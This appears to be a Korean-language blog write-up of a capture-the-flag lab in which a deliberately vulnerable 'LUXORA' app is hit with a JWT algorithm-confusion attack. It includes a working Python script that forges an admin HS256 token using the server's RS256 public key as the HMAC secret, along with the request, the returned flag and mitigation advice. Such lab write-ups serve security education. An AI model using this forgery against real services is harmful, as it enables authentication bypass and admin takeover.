+++
title = "VulnABLE CTF [LUXORA]: JWT Attacks 🥇 Gold (Algorithm Confusion)"
description = "LUXORA 플랫폼의 JWT 알고리즘 혼동(Algorithm Confusion) 취약점을 이용한 비대칭 키 서명 우회 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "JWT", "Gold", "Algorithm Confusion", "Public Key"]
+++

# VulnABLE CTF [LUXORA]: JWT Attacks 🥇 Gold

이전 단계(Silver)에서는 비밀키를 무차별 대입(Brute-force)하여 알아냈습니다. 이에 LUXORA의 개발자는 방어 대책으로 **비대칭 키 방식인 RS256**을 도입했습니다. 이제 서버는 아주 복잡한 개인키(Private Key)로 서명하고, 외부에 공개된 공개키(Public Key)로 서명을 검증합니다.

하지만 개발자가 토큰 검증 로직을 구현할 때 한 가지 치명적인 실수를 저질렀습니다. 바로 **알고리즘 혼동(Algorithm Confusion) 공격**입니다. `/jwt/gold` 라우트에서 이를 공략해보겠습니다.

---

## 🕒 1. 타겟 탐색 및 공개키 획득 (Reconnaissance)

`/jwt/gold` 환경에서는 토큰 헤더의 `alg` 값이 `RS256`으로 설정되어 있습니다.

비대칭 키 환경에서는 누구나 서명이 올바른지 검증할 수 있도록 공개키를 웹 서버 어딘가에 공개해둡니다. (보통 `/.well-known/jwks.json` 이나 `/public.pem` 같은 경로에 있습니다.)

탐색 결과, `/public.pem` 경로에서 서버의 공개키를 획득했습니다!

**[획득한 public.pem]**
```text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyYqG...
...
-----END PUBLIC KEY-----
```

**[해커의 사고 과정]**
* 이 공개키는 서버가 내 토큰의 "RS256" 서명을 검증할 때 사용하는 키다.
* 서버 백엔드 코드가 대략 `jwt.verify(token, publicKey)` 처럼 생겼을 것이다.
* 그런데 만약 내가 토큰 헤더의 `alg`를 `HS256`(대칭 키)으로 바꿔서 보낸다면?
* 취약한 JWT 라이브러리는 `HS256`이라는 글자를 보고, 검증용으로 전달받은 `publicKey` 문자열 전체를 그냥 단순한 **대칭 키(Secret Key)**처럼 사용해서 HMAC 해시를 돌려버린다!

---

## 🕒 2. 취약점 식별 및 공격 원리 (Exploitation)

이 취약점은 서버가 헤더의 `alg` 값을 맹신하여 검증 알고리즘을 동적으로 바꿀 때 발생합니다.

### 💡 알고리즘 혼동 (Algorithm Confusion)
1. 서버의 의도: "토큰이 RS256이니까, `public.pem`을 '공개키'로 써서 복호화해봐야지."
2. 해커의 조작: 토큰 헤더를 `HS256`으로 변조.
3. 서버의 오작동: "어? 토큰이 HS256이네? 그럼 내가 가진 검증키(`public.pem` 문자열)를 통째로 '비밀키'로 간주하고 HMAC 해시를 돌려볼까?"

즉, 해커가 `public.pem` 파일의 내용 자체를 비밀키(Secret)로 삼아 HS256 서명을 만들면, 서버는 이를 완벽하게 올바른 서명으로 착각하게 됩니다!

---

## 🕒 3. 토큰 위조 수행

획득한 공개키 문자열 전체를 비밀키로 사용하여 파이썬 스크립트나 `jwt.io` (또는 로컬 스크립트)를 통해 토큰을 조작합니다.

### Step 1. Header 조작
`"alg": "RS256"` ➔ `"alg": "HS256"` 으로 변경.

### Step 2. Payload 조작
`"role": "guest"` ➔ `"role": "admin"` 으로 변경.

### Step 3. 서명 생성 (HMAC-SHA256)
이때 사용되는 비밀키(Secret)는 방금 다운받은 `public.pem` 파일의 텍스트 원본(줄바꿈 등 포맷 완벽히 일치해야 함)입니다.

**[Python을 이용한 위조 스크립트 예시]**
```python
import hmac
import hashlib
import base64
import json

# 다운받은 공개키 원본
public_key = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgk...\n-----END PUBLIC KEY-----\n"

header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "hacker", "role": "admin"}

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

header_b64 = b64url(json.dumps(header).encode())
payload_b64 = b64url(json.dumps(payload).encode())

message = header_b64 + b"." + payload_b64

# 공개키를 '비밀키'로 사용하여 HS256 서명 생성!
signature = hmac.new(public_key, message, hashlib.sha256).digest()
signature_b64 = b64url(signature)

token = message + b"." + signature_b64
print("Forged Token:", token.decode())
```

---

## 🕒 4. 권한 탈취 및 플래그 획득 🚩

위 스크립트로 생성한 위조 토큰을 들고 관리자 엔드포인트 `/jwt/gold/admin` 에 접근합니다.

```http
GET /jwt/gold/admin HTTP/1.1
Cookie: token=[위조된 HS256 토큰]
```

### 🔍 공격 결과
서버는 취약한 로직에 따라 `public.pem`을 대칭키로 사용하여 서명을 검증했고, 해커가 만든 서명과 정확히 일치하여 검증을 통과했습니다!

```json
{
  "message": "Welcome Admin! High Security Area Accessed.",
  "flag": "FLAG{JWT_🥇_ALG_CONFUSION_H7J8K9}"
}
```

**플래그 획득:** `FLAG{JWT_🥇_ALG_CONFUSION_H7J8K9}`

---

## 🛡️ 방어 대책 (Mitigation)

알고리즘 혼동 공격을 막기 위해서는 서버가 토큰의 헤더를 절대 믿어서는 안 됩니다.

1. **알고리즘 고정 (Hardcoding Algorithm)**: `jwt.verify(token, publicKey, { algorithms: ['RS256'] })` 처럼 검증 함수를 호출할 때 서버가 기대하는 알고리즘을 명시적으로 배열 형태로 전달해야 합니다. 이렇게 하면 토큰 헤더가 `HS256`으로 변조되어 들어오더라도 라이브러리가 즉시 에러를 반환합니다.
2. **비대칭 키/대칭 키 혼용 검증 API 분리**: 최신 라이브러리들은 키의 타입(문자열 vs 인증서 객체)과 명시된 알고리즘이 일치하지 않으면 아예 검증을 거부하도록 자체 패치가 되어 있습니다. 항상 사용하는 JWT 라이브러리를 최신 버전으로 유지해야 합니다.

다음은 웹 해킹의 또 다른 꽃, **Server-Side Template Injection (SSTI)** 카테고리를 살펴보도록 하겠습니다!